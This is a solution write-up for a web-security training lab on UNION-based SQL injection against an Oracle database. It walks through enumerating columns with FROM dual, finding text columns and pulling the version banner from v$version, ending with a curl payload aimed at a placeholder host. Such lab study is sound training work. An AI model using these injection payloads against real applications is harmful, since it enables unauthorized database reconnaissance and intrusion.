# SQL injection attack, querying the database type and version on Oracle — Practitioner

**Status:** Solved

---

## Goal

Exploit a SQL injection vulnerability to determine the database version. This lab uses an Oracle database, and you need to display the database version string.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Test for SQL injection**
   - Try basic injection:
```
   /filter?category=Gifts'
```
   - You should get an error or unusual behavior

3. **Determine the number of columns**
   - Oracle requires a FROM clause, so we use `UNION SELECT` with `FROM dual`
   - Try different column counts:
```
   Gifts' UNION SELECT NULL FROM dual--
   Gifts' UNION SELECT NULL,NULL FROM dual--
```
   - Keep adding NULLs until the error disappears
   - Let's say it works with 2 columns

4. **Find string-compatible columns**
   - Replace NULL with string to find which columns accept text:
```
   Gifts' UNION SELECT 'abc',NULL FROM dual--
   Gifts' UNION SELECT NULL,'abc' FROM dual--
```
   - Find which positions display strings without errors

5. **Extract Oracle version**
   - Use Oracle's version query `banner` from `v$version`:
```
   Gifts' UNION SELECT banner,NULL FROM v$version--
```
   - Or if both columns need strings:
```
   Gifts' UNION SELECT banner,'abc' FROM v$version--
```

6. **Execute the injection**
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version--"
```

7. **Verify success**
   - The database version will be displayed on the page
   - You'll see something like "Oracle Database 11g Enterprise Edition..."
   - Lab automatically solves once version is displayed

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- Column enumeration:
```
Gifts' UNION SELECT NULL,NULL FROM dual--
```
- Final payload:
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version--"
```

---

## Oracle-specific notes

- **FROM dual**: Oracle requires a FROM clause in SELECT statements. `dual` is a dummy table with one row
- **v$version**: Oracle system view that contains version information
- **banner column**: Contains the version string in human-readable format
- Always use `--` for comments (some Oracle versions don't support `#`)

---

## Why this works

The UNION operator combines results from two SELECT statements. By determining the correct number of columns and data types, we can inject our own SELECT statement that queries system tables like `v$version`. Oracle's `dual` table is perfect for this because it always exists and returns exactly one row, making it ideal for injecting arbitrary queries.

---

